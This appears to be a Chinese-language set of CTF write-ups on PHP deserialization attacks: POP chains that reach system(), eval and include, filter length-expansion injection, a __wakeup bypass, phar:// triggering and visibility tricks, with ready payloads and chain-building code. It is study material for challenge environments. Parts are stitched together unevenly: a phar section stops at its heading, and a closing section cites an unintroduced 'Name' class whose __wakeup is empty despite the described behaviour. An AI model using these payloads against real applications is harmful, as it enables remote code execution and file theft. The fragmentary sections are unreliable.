    Geek_Challenge2026 — POP 链与长度扩张绕过

    题目类型：Web — PHP 反序列化（POP 链）+ 过滤后长度扩张

    题目地址：Geek_Challenge 2026（实例已关闭）

    Flag：SYC{82a8d7ba-d362-4f0e-a49c-22abe6a72b32}

    题目概述

    题目接收 user 和 sign 两个参数，把它们塞进 A 类后序列化、过一遍过滤器，再反序列化：

    $entry = new A($u, $s);
$ser = serialize($entry);
$escaped = filter($ser);
unserialize($escaped);

    过滤器只有一句话：

    function filter($data) {
    return str_replace("admin", "hacker", $data);
}

    admin 5 个字符，hacker 6 个字符 —— 每替换一次，字符串就多一个字节，但序列化串里的长度数字不会跟着变。

    七个类的骨架（完整源码见文末）：

    A  __destruct  →  echo "…" . $this->sign          （把对象当字符串拼接）
B  __toString  →  (string)$func()                 （把对象当函数调用）
C  __invoke    →  $this->target->$m()             （调用不存在的方法）
D  __call      →  return $this->next->$p          （读取不存在的属性）
E  __get       →  $sink->flag_trigger = $cmd      （写私有属性）
F  __set       →  system($value)                  ← 代码执行在这里

    解题过程

    Step 1：先找能执行代码的地方

    审计代码，先找能执行代码的地方，然后倒着推。

    全文只有一个真正的执行点：

    class F {
    private $flag_trigger;
    public function __set($name, $value) {
        if ($name !== 'flag_trigger') return;
        echo "RCE:<br>";
        system($value);          // ← 终点
    }
}

    所以要满足两个条件：$name === 'flag_trigger'，且 $value 是我能控制的字符串。

    Step 2：倒推 —— 谁能写 F 的私有属性

    $flag_trigger 是 private，从类外部写它就会触发 __set。谁在写它？看 E：

    class E {
    public $sink;
    public $cmd;
    public function __get($name) {
        if (!($this->sink instanceof F)) return;
        $this->sink->flag_trigger = $this->cmd;   // ← 写私有属性
    }
}

    E::__get 里写了 $this->sink->flag_trigger —— 只要 sink 是 F 的实例，就会走到 __set，$value 就是 $this->cmd。

    所以 cmd 就是我的命令，从这里传进去。

    Step 3：倒推 —— 谁读 E 的不存在属性

    __get 是在访问不可访问属性时触发的。看 D：

    class D {
    public $next;
    public $property;
    public function __call($name, $arguments) {
        if (!is_object($this->next) || !is_string($this->property)) return '';
        $p = $this->property;
        return $this->next->$p;      // ← 读 $next 的属性 $p
    }
}

    只要 property 写成 E 里不存在的名字（比如 flag），$this->next->$p 就会触发 E::__get。

    E 的两个属性是 sink 和 cmd，所以 property 不能是这两个 —— 我用的是 flag。

    Step 4：倒推 —— 谁调 D 的不存在方法

    __call 在调用不存在的方法时触发。看 C：

    class C {
    public $target;
    public $method;
    public function __invoke() {
        if (!is_object($this->target) || !is_string($this->method)) return '';
        if (!method_exists($this->target, '__call') || method_exists($this->target, $this->method)) return '';
        $m = $this->method;
        return $this->target->$m();      // ← 调 $target 的方法 $m
    }
}

    这里有个反向条件，最容易看错：

    必须 method_exists($target, '__call')        → target 得是有 __call 的类（就是 D）
必须 !method_exists($target, $method)        → 这个方法名不能真的存在

    所以 method 随便写一个 D 里没有的名字就行（我用 flag），这样才会落到 __call。

    Step 5：倒推 —— 谁把对象当函数调用

    __invoke 在对象被当成函数调用时触发。看 B：

    class B {
    public $action;
    public function __toString() {
        if (!is_object($this->action) || !method_exists($this->action, '__invoke')) return '';
        $func = $this->action;
        return (string)$func();          // ← 对象当函数调
    }
}

    action 放 C 的实例，$func() 就会触发 C::__invoke。

    Step 6：倒推 —— 谁把 B 当字符串

    __toString 在对象被当做字符串处理时触发。 看 A：

    class A {
    public $user;
    public $sign;
    public function __destruct() {
        echo "Welcome to Geek_Challenge2026!<br>";
        echo "Profile signature: " . $this->sign . "<br>";   // ← 字符串拼接
    }
}

    $this->sign 用 . 拼接，把对象当字符串 —— 把 B 的实例放进去，就会触发 B::__toString。

    到这里整条链就闭合了：

    A::__destruct  →  B::__toString  →  C::__invoke  →  D::__call  →  E::__get  →  F::__set  →  system()

    Step 7：构造 pop 链

    这道题完全按照从上往下的顺序触发，所以正着讲就是 A → B → C → D → E → F。

    $a = new A();
$a->user = 'admin';
$a->sign = new B();
$a->sign->action = new C();
$a->sign->action->target = new D();
$a->sign->action->method = 'flag';
$a->sign->action->target->next = new E();
$a->sign->action->target->property = 'flag';
$a->sign->action->target->next->sink = new F();
$a->sign->action->target->next->cmd = 'env';

    Step 8：绕过 __wakeup

    在反序列化时会先调用 __wakeup，然后它会把 $this->action 置为空：

    class B {
    public function __wakeup() {
        echo "唉？你怎么醒了，回去吧你<br>";
        $this->action = null;      // ← 链从这里就断了
    }
}

    所以这里最后输出序列化串的时候，记得把 B 的属性数加 1 绕过 wakeup 方法。

    实际只有 1 个属性，却写成 2      O:1:"B":2:{s:6:"action";O:1:"C":…}

    原理是 CVE-2016-7124：属性数大于实际个数时，PHP 会跳过 __wakeup。只在 PHP < 5.6.25 / 7.0.10 有效 —— 这题能过，说明目标 PHP 就在这个范围内。

    Step 9：为什么是 192 —— 长度扩张

    前面序列化一次、过滤一次，问题出在过滤改变了字符串长度，但长度数字没变。

    设 A = admin 的个数，b = 注入的那串（";s:4:"sign";O:1:"B":2:{…）：

    过滤前   声明长度 N = 5A + len(b)
过滤后   实际长度   = 6A + len(b)      （每个 admin 多 1 字节）
解析器   只读 N 个字节 → 落在 5A + len(b) 这个位置

    注入的 "; 在 b 的开头，也就是过滤后的 6A 处。要让解析器正好读到这里，需要：

    5A + len(b) = 6A     →     A = len(b)

    所以「192」不是随便挑的 —— 它同时是 b 的长度和 admin 的个数。

    这也是为什么换命令的时候别忘记改 admin 的个数：命令变长，b 变长，A 就得跟着变。

    长度别自己数，用 echo strlen($b) 让 PHP 输出，我上面脚本里就是这么做的。

    解题思路总结

    审计源码，先找唯一的执行点：F::__set 里的 system($value)
  → 谁能写 F 的私有属性 → E::__get（写 flag_trigger）
    → 谁读 E 的不存在属性 → D::__call（读 $next->$p）
      → 谁调 D 的不存在方法 → C::__invoke（调 $target->$m）
        → 谁把对象当函数调 → B::__toString（(string)$func()）
          → 谁把 B 当字符串拼 → A::__destruct（echo "…" . $sign）
            → 链成型：A → B → C → D → E → F
              → 属性数 +1 跳过 __wakeup
                → admin 个数 = 注入串长度，让解析器读到注入的 ";
                  → system 执行 → env → flag

    漏洞原理

    ① 魔术方法是"自动触发"的，不是被调用的

    __destruct / __toString / __invoke / __call / __get / __set 都不需要显式调用 —— 只要你把对象放在那个位置，PHP 自己会触发。

    反序列化的价值就在于：我能完全控制每个属性的值和类型。

    ② 每一层都有前置检查，但检查的是"类型"不是"意图"

    层 检查什么 怎么满足
    B action 是对象且有 __invoke 放 C 的实例
    C target 是对象、method 是字符串、target 有 __call、且没有同名方法 放 D 的实例，方法名随便写
    D next 是对象、property 是字符串 放 E 的实例
    E sink 是 F 的实例 放 F 的实例
    F $name === 'flag_trigger' 由 E 固定写入这个属性名

    ③ 长度扩张：过滤器和序列化器看到的长度不一样

    serialize()  按"过滤前"的长度写进串
filter()     把 5 字节的 admin 换成 6 字节的 hacker
unserialize() 按串里写的长度去读 —— 读的位置被"多出来的字节"整体推后

    于是我可以控制"解析器停在哪" —— 停在注入的 "; 上，后面那一串就成了新的结构。

    关键知识点

    知识点 说明
    找终点 审计先找执行点（system / eval / include / call_user_func），再倒着推
    POP 链 利用属性把对象串起来，靠魔术方法的自动触发一层层走到终点
    反向条件 !method_exists($target, $method) —— 要求方法名不存在，最容易看错
    __wakeup 绕过 序列化串里属性数写大于实际个数（CVE-2016-7124，PHP < 5.6.25 / 7.0.10）
    长度扩张 过滤器把短串换成长串，序列化串里的长度数字不变 → 解析位置错位
    长度对齐 admin 的个数必须等于注入串的长度，解析器才会正好停在注入的 "; 上
    工具 长度用 strlen() 输出，不要手数
    PHP 魔术方法的触发时机

    （这段是原理的地基 —— 记住"在什么时机被自动调用"，POP 链就是按时机拼起来的。）

    方法 触发时机
    __construct() 用于在创建对象时自动触发：当使用 new 关键字实例化一个类时，会自动调用该类的 __construct() 方法
    __destruct() 用于在对象被销毁时自动触发：对象被销毁、引用计数减少为零时触发
    __sleep() 序列化 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组
    __wakeup() 用于在反序列化对象时自动调用：unserialize() 会检查是否存在一个 __wakeup() 方法，如果存在，则会先调用 __wakeup() 方法
    __toString() 在对象被当做字符串处理时自动调用，比如 echo、==、preg_match()
    __invoke() 在对象被当做函数处理时自动调用
    __call() __call($method, $args) 在调用一个不存在的方法时触发，$args 是数组的形式
    __callStatic() 在静态调用或调用成员常量时，使用的方法不存在时触发
    __set() 在给不存在的成员属性赋值时触发
    __isset() 在对不可访问属性使用 isset() 或 empty() 时会被触发
    __unset() 在对不可访问属性使用 unset() 时会被触发
    __clone() 当使用 clone 关键字拷贝完成一个对象后就会触发
    __get() 当尝试访问不可访问属性时会被自动调用

    Magic Invoker（2026ZeroGCTF）

    源码 · 四类速览

    审计：能拿到 flag 的只有两处

    先审计四段代码，发现可以利用得到 flag 的只有两个地方：

    ① Invoker 里 __destruct 中的 eval —— 命令执行
② FlagReader 里 __call —— 读 /flag

    既然 FlagReader 可以直接读 flag，那先考虑这个方法。

    __call 的触发方法是调用了不存在的方法，这里要 $name === 'getFlag'。但是查看这些代码，根本没有调用这个方法的，所以这就是个陷阱，忽略它。

    Invoker 是直接的 sink

    接着看 eval 竟然在 __destruct 里 —— 那么只要传进序列化串就会触发。

    public function __destruct() {
    eval($this->code);
}

    所以只用一个 Invoker 对象就够了，不需要拼链。

    直接先查文件：

    O:7:"Invoker":1:{s:4:"code";s:14:"system('ls ');";}

    发现存在 index.php 和 challenge.php 两个文件。

    两个文件的关系和我原先的猜测相反

    这里 index.php 一般是网页入口，所以先看 challenge.php —— 它确实就是页面上那四个类的定义。

    那就接着查看 index.php：

    里面直接写了 flag 怎么拿：

    /*
 * Flag：由平台以环境变量 FLAG 动态注入，选手 RCE 后 env/printenv FLAG 读取。
 */

    env 能列，printenv FLAG 不行

    他这里说 env / printenv FLAG 都可以拿，我试了：

    env 和 printenv（不带参数）都能拿，加上 FLAG 就不行 —— 因为 printenv 是精确匹配的，而里面 FLAG 前面还有一串东西，所以匹配不到就查询不到。

    实际的变量名是：

    ZEROG_2026_FLAG=flag{...}

    所以 printenv FLAG 找的是 FLAG 这个不存在的名字，什么都不会打印；而 env 是全量列出，一眼就能看见。

    这也说明：index.php 注释里写的「环境变量 FLAG」和实际实现不一致 —— 注释是当时的意图，不代表现在的名字。

    注释可以过时，env 不会骗你。

    顺带一个坑：cat /index.php 为什么不行

    我一开始想 cat /index.php，结果什么都没出来；换成 cat index.php 就有了。

    因为这两个是完全不同的东西：

    /index.php   ← 文件系统根目录下的 index.php   → 不存在
index.php    ← 当前工作目录下的 index.php      → 存在

    / 是 Linux 文件系统的根，不是网站的根。网站目录一般是 /var/www/html 之类，而 cat 不给路径时用的是当前工作目录（cwd）—— 从 ls 的结果看，cwd 就是网站目录，所以相对路径能命中。

    而且 cat /index.php 报的 No such file or directory 走的是 stderr，system() 只回显 stdout，所以页面看起来就是「什么都没发生」。

    用 cat /index.php 2>&1 才能看见那条错误。

    源码

    审计代码发现只要触发 __destruct 就可以执行代码，所以要想办法触发 __destruct。

    想到 phar 反序列化可以在没有 unserialize() 的情况下触发 __destruct —— 代码里唯一的入口就是 file_exists($filename)，而它正好是能吃 phar:// 的文件函数。

    为什么能这样：phar 文件的 manifest 里可以存一段序列化 metadata；任何函数只要访问 phar:// 开头的路径，PHP 就会解析这个 phar，解析时把 metadata 自动反序列化 —— 于是对象被重建，脚本结束时 __destruct() 自动执行。

    找上传点

    源代码强调了 upload，去访问一下 upload.php。

    先随便尝试上传一个 txt 文件，提示只能 jpg/jpeg。

    将 txt 文件修改后缀可以直接上传，所以就明确了这道题的方向：构造一个 phar 文件，修改后缀为 jpg 上传之后通过 phar:// 触发。

    造 phar

    [MRCTF2020] Ezpop

    先审计代码

    发现是 PHP 序列化串（先附上相关知识点）：

    从终点往回找

    先找可以执行的地方。

    在 Modifier 类的 append 下有 include 可以利用，而调用 include 需要先有 __invoke 的调用。

    触发 __invoke 的方式是有对象被当成函数来调用，所以去找哪里是可以把对象当成函数来调用的 —— 观察到在 Test 类的 __get() 里会调用 $function()，也就达成了 __invoke 的触发要求。

    再看 __get 的触发条件：当访问不存在的属性时会被调用。也就是说，访问 Test 类中不存在的属性时会被调用。

    所以这里再去看最后一个类，发现 __toString 中会去访问 $this->str->source —— 这里我们只要让 str 为 Test 类，那它去访问 str->source 时就会触发 __get。

    接着要考虑 __toString 的触发条件：当把一个对象当成字符串来执行时会触发。

    那很明显就是 preg_match：

    preg_match('/正则表达式/', $字符串, $匹配结果数组);

    这里他把 $this->source 放进了 preg_match 的第二个参数，所以我们只要让他作为一个类 —— 又因为要同时包含 str，所以只能是 Show 类。

    最后是如何触发 __wakeup：它的触发条件是当使用 unserialize 时触发，那么就完成了闭环。

    逆推方向（找链的顺序）

    include ← __invoke ← __get ← __toString ← __wakeup ← unserialize($_GET['pop'])

    这是从终点往入口找的顺序。

    正向执行顺序（实际跑起来的样子）

    unserialize($_GET['pop'])
    → Show::__wakeup()          preg_match(..., $this->source) 把对象当字符串
    → Show::__toString()        $this->str->source 读不存在的属性
    → Test::__get('source')     $function = $this->p; $function()
    → Modifier::__invoke()      $this->append($this->var)
    → Modifier::append()        include($value)

    这条 POP 链就走完了。

    构造序列化

    class Modifier {
    protected $var = "php://filter/convert.base64-encode/resource=flag.php";
}
class Test { public $p; }
class Show { public $source; public $str; }

$pop = new Show;
$pop->source = new Show;        // 外层 source → 内层 Show（触发 __toString）
$pop->source->str = new Test;   // 内层的 str → Test（触发 __get）
$pop->source->str->p = new Modifier;   // Test 的 p → Modifier（触发 __invoke）
echo serialize($pop);
echo ("<br>");
echo urlencode(serialize($pop));

    四层的分工：

    层 属性 给谁用
    外层 Show source __wakeup 的 preg_match
    内层 Show str __toString 的 $this->str
    Test p __get 的 $function
    Modifier var append 的 include

    为什么要用伪协议

    这里因为直接 include 会把 PHP 代码执行掉（而 flag.php 里没有 echo，执行完什么都不输出）， 所以我们利用伪协议先把它编码成 base64 —— 编码后的文本不含 <?php，include 就会原样输出而不是执行。

    php://filter/convert.base64-encode/resource=flag.php

    \0 的坑

    注意：因为 var 的属性是 protected，序列化时会生成 \0*\0var（长度 6，两个空字节也算）。

    但是如果你直接把它复制到 URL 上，这两个空字节会被吞掉，s:6:"*var" 长度就对不上了。

    所以生成时最好就直接 urlencode()，避免出错：

    echo urlencode(serialize($pop));

    编码后这一小段是 s:6:%22%00*%00var%22。

    拿 flag

    最后得到 base64 编码的 flag，解码就好了。

    ?pop=<urlencode 后的整条串>
→ 页面吐出 base64
→ 解码 → flag.php 源码 → flag

    这题的收获

    第一次做 POP 链，最有用的一条是：

    不能从头读代码，要从能干活的那个函数（sink）往回找。

    ① 找 sink      include / eval / system / call_user_func
② 谁能碰到它    哪个魔术方法里调用了它
③ 那个魔术方法怎么触发   对象当字符串？当函数？读不存在的属性？
④ 一路往回，直到 unserialize

    中间那条 __get 最容易绕晕：它不是"属性值为空"，而是"这个类里根本没有这个属性"。 Test 只有 $p，所以读 ->source 必然触发 —— 你什么都不用设。

    [DASCTF] FileHandler 反序列化

    打开题目直接就是源码，highlight_file 把整个文件摊出来了。先审计。

    <?php
include("flag.php");
highlight_file(__FILE__);

class FileHandler {
    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            ...
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}

    判断

    第一件事：include("flag.php") 说明 flag 和入口同目录，而且我们要的是它的源码，不是执行结果。

    file_get_contents 不走 PHP 解析器，读出来就是磁盘上的原文。这一点是这题的关键 —— 不是去读"执行后输出"，是直接把文件读出来。

    第二件事：只有 read() 能读文件，怎么进去？

    入口只有 unserialize，唯一的触发点是 __destruct：

    __destruct() → process() → read()

    但中间有两道类型检查：

    位置 写法 作用
    __destruct $this->op === "2" 强比较 字符串 "2" 会被改成 "1"，走 write
    process $this->op == "2" 弱比较 整数 2 也成立，走 read

    所以 op 必须序列化成整数：

    s:2:"op";i:2;

    第三件事：属性是 protected，怎么绕 is_valid？

    protected 属性序列化后是 \0*\0op（两个空字节夹一个星号），而 is_valid 卡的是 ord() >= 32，空字节 ord = 0 直接被拒。

    但这题根本不用碰空字节 —— unserialize 不对属性做检验，所以构建序列化串的时候直接用 public 属性名就行，protected $op 一样写得进去：

    s:2:"op";i:2;        ← 属性是 protected，但这里按 public 写

    最终 payload

    /?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}

    返回：

    [Result]: <br><?php $flag='CTF2{a8da662d-ba4e-44da-9655-ffd89b301ecb}';

    页面为什么看着什么都没有

    两个原因叠在一起：

    1. 浏览器把 <? 当成 bogus comment（无效注释），一路吞到下一个 >，所以这段字不在渲染结果里 —— Ctrl+U 看源代码就有；
    2. __destruct 是在脚本结束时才触发的，输出天然追加在页面最末尾、highlight_file 的源码后面。

    收获

    • 同一个属性在不同位置可以是不同类型检查：=== "2" 拦字符串，== "2" 收整数。找"哪个类型能同时过两道"比硬刚一个点快。
    • unserialize 不做可见性检查：protected / private 的空字节前缀不是必须的，public 名字一样能写进去。序列化里的可见性前缀只影响"生成时怎么写"，不限制"解析时怎么读"。
    • file_get_contents 读的是源码：想拿 PHP 文件的原文用它，不是 include。
    • __destruct 是最好用的触发器：对象没人接住也会在脚本结束时析构，unserialize 完什么都不用做。

    进阶：真要写 protected 形式的话

    is_valid 拦空字节，但 PHP 反序列化支持大写 S 的转义字符串，\00 在原文里是 3 个可打印字符（\、0、0，全在 32~125 之间），unserialize 时才还原成空字节：

    S:5:"\00*\00op";i:2;

    这一招专门用于绕过"禁止空字节"的过滤器，记进反序列化专题。

    绕过 __wakeup

    但是要注意这里的 __wakeup()，它会直接将 username 修改为 guest：

    function __wakeup() {

}

    所以这里必须绕过。利用的办法是：当序列化串声明的属性个数大于实际属性个数时，会直接跳过 __wakeup()。

    这个技巧有版本限制

    这是 CVE-2016-7124，影响 PHP < 5.6.25 / 7.0.10。

    在 PHP 7.4 上实测：O:4:"Name":3:{...} 会直接解析失败（不是跳过 __wakeup，是整个包解析不了）。

    关于 %00

    另外，直接将这个复制到 URL 上时，private 属性名两侧的 %00 会被吞掉，所以先进行 URL 编码再放上去，或者放上去之后再自己手补 %00。

    最终 payload

    /?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}

    O:4:"Name":3: 后面那个冒号不能丢

    ✅ O:4:"Name":3:{...}

    ❌ O:4:"Name":3{...} ← 少一个冒号，unserialize 直接返回 false

    补充：private 和 public 的序列化区别

    private 属性下，构造的序列化串是「类名 + 属性名」的形式（别忘了 %00）：

    s:14:"\0Name\0username"      ← \0 + Name + \0 + username = 1+4+1+8 = 14

    而 public 方式只是属性名的形式：

    s:8:"username"

    protected 则是 \0*\0属性名。

    长度一律按真实字节数算，\0 算 1 个字节 —— 这也是手写 payload 最容易错的地方。
